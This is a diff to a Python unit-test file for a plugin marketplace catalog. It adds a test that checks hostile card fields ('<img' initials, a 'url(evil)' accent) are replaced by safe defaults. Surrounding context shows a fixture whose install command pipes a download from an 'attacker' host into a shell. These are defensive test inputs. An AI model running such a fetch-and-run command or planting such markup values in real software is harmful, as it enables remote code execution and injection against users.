@@ -77,6 +77,14 @@ class StoreModelTests(unittest.TestCase):
         self.assertFalse(items[0].install_available)
         self.assertEqual(install_args(items[0]), [])
 
+    def test_card_identity_and_accent_are_bounded_to_known_values(self):
+        items, _ = normalize_catalog({"plugins": [plugin(
+            initials="<img", accent="url(evil)", stars=12
+        )]})
+        self.assertEqual(items[0].initials, "TC")
+        self.assertEqual(items[0].accent, "coral")
+        self.assertEqual(items[0].stars, 12)
+
     def test_marketplace_install_commands_are_ignored(self):
         items, _ = normalize_catalog({"plugins": [plugin(
             installCommand="bash -c 'curl attacker | sh'"
